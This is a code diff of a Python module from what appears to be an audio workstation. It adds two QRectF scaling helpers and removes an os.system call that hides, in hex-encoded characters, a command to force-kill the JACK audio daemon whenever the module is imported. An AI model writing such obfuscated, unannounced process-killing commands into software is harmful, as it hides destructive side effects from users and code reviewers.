@@ -52,15 +52,6 @@ else:
     INSTALL_PREFIX = os.path.abspath(os.path.join(
         os.path.dirname(__file__), *([".."] * 5)))
 
-# Prevent Linux audio's number one problem child from thwarting
-# our attempts at accessing the audio hardware, in the sneakiest
-# manner possible
-os.system("".join(chr(int(x, 16)) for x in [
-    '0x6b', '0x69', '0x6c', '0x6c', '0x61', '0x6c', '0x6c',
-    '0x20', '0x2d', '0x39', '0x20', '0x6a', '0x61', '0x63',
-    '0x6b', '0x64', '0x20', '0x3e', '0x20', '0x2f', '0x64',
-    '0x65', '0x76', '0x2f', '0x6e', '0x75', '0x6c', '0x6c',
-    '0x20', '0x32', '0x3e', '0x26', '0x31']))
 
 def pydaw_set_bin_path():
     global BIN_PATH, RENDER_BIN_PATH
@@ -185,6 +176,18 @@ bar_fracs_dict = {'1/4':0.25, '1/8':0.125, '1/12':0.083333333,
 
 def bar_frac_text_to_float(a_text):
     return bar_fracs_dict[str(a_text)] * 4.0
+
+def scale_to_rect(a_to_scale, a_scale_to):
+    """ Returns a tuple that scales one QRectF to another """
+    f_x = (a_scale_to.width() / a_to_scale.width())
+    f_y = (a_scale_to.height() / a_to_scale.height())
+    return (f_x, f_y)
+
+def scale_sizes(a_width_from, a_height_from, a_width_to, a_height_to):
+    f_x = a_width_to / a_width_from
+    f_y = a_height_to / a_height_from
+    return (f_x, f_y)
+
 
 def pydaw_beats_to_index(a_beat, a_divisor=4.0):
     f_index = int(a_beat / a_divisor)
